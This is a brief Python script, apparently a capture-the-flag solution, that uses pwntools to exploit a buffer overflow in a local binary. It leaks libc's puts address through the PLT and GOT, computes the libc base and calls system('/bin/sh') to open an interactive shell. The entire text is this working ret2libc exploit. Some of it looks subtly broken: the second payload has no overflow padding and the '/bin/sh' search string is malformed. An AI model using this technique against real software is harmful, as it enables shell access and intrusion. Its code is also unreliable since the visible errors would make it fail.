from pwn import *
#context_level='DEBUG'

p = process("./binary")
elf = ELF("./binary", checksec=False)
libc = elf.libc

def main():

	p.clean(1)

	payload = ""
	payload += "A"*136
	payload += p32(elf.plt['puts'])
	payload += p32(elf.symbols['main'])
	payload += p32(elf.got['puts'])

	p.sendline(payload)
	p.recvline()

	libc_puts = u32(p.recv(4))
	log.info("Libc puts: " + hex(libc_puts))

	libc.address = libc_puts - libc.symbols['puts']
	bin_sh = next(libc.search("/bin/sh\0x00"))

	p.clean(1)

	payload = ""
	payload += p32(libc.symbols['system'])
	payload += p32(libc.symbols['exit'])
	payload += p32(bin_sh)

	p.sendline(payload)

	p.interactive()

if __name__=="__main__":
	main()
